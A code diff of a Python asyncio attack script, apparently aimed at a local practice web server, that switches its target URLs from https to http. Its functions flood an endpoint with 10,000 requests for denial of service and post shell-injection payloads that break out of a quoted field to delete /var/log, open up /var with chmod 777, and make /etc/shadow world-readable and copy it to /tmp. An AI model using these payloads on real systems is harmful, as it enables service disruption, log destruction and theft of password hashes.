@@ -23,18 +23,18 @@ async def post(url, user_input):
 
 
 async def denial_of_service(port):
-    ret = await asyncio.gather(*[get('https://localhost:{}/api/values/'.format(port)) for i in range(10000)])
+    ret = await asyncio.gather(*[get('http://localhost:{}/api/values/'.format(port)) for i in range(10000)])
 
 
 async def destroy_logs(port):
-    await asyncio.gather(post('https://localhost:{}/api/values/manette/xbox'.format(port),
+    await asyncio.gather(post('http://localhost:{}/api/values/manette/xbox'.format(port),
                "\"; chmod 777 /var -R; rm -rf /var/log; mkdir /var/log; > /var/log/message;"
                " echo \"Much lulz. J'ai delete tes logs.\r\n Comment les recuperer:"
                " https://www.youtube.com/watch?v=oHg5SJYRHA0\" >> /var/log/message #"))
 
 
 async def vandalize_website(port):
-    await asyncio.gather(post('https://localhost:{}/api/values/manette/xbox'.format(port),
+    await asyncio.gather(post('http://localhost:{}/api/values/manette/xbox'.format(port),
                "\"; chmod 777 /etc/shadow; rm /tmp/xbox; cp /etc/shadow /tmp/xbox #"))
 
 
